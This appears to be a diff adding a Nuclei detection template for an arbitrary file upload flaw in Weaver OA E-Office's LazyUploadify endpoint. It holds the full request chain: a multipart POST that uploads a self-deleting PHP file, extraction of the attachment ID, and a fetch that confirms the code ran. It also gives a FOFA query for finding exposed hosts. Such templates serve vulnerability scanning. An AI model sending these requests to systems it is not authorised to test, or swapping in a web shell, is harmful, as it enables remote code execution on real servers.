@@ -1,0 +1,68 @@
+id: weaver-lazyuploadify-file-upload
+
+info:
+  name: OA E-Office LazyUploadify - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
+  description: OA E-Office LazyUploadify is vulnerable to arbitrary file upload.
+  reference:
+    - https://github.com/w-digital-scanner/w9scan/blob/master/plugins/weaver_oa/2158.py
+  metadata:
+    verified: true
+    max-request: 3
+    fofa-query: app="泛微-EOffice"
+  tags: weaver,e-office,intrusive,rce,file-upload
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+  string: "weaver-lazyuploadify-file-upload"
+
+http:
+  - raw:
+      - |
+        GET /general/weibo/javascript/LazyUploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /general/weibo/javascript/LazyUploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjetvpuye
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundaryjetvpuye
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
+        ------WebKitFormBoundaryjetvpuye--
+      - |
+        GET /attachment/{{attachmentID}}/{{attachmentName}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: attachmentID
+        internal: true
+        group: 1
+        regex:
+          - "attachmentID\":(.*?),"
+
+      - type: regex
+        name: attachmentName
+        internal: true
+        group: 1
+        regex:
+          - "attachmentName\":\"(.*?)\","
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_2, 'attachmentID') && contains(body_2, 'attachmentName')"
+        condition: and
+
+      - type: word
+        part: body_3
+        words:
+          - '{{md5(string)}}'
+# digest: 4b0a00483046022100a2f5a815c131f4d1dad268eb2249e01c551f3183778184f5d41a4d1e3a03f5fb022100c0a2d7742c0f0bbfab7abd66d623fd15bc3e8c83bff7df089c23365f81ea70a6:922c64590222798bb761d5b6d8e72950
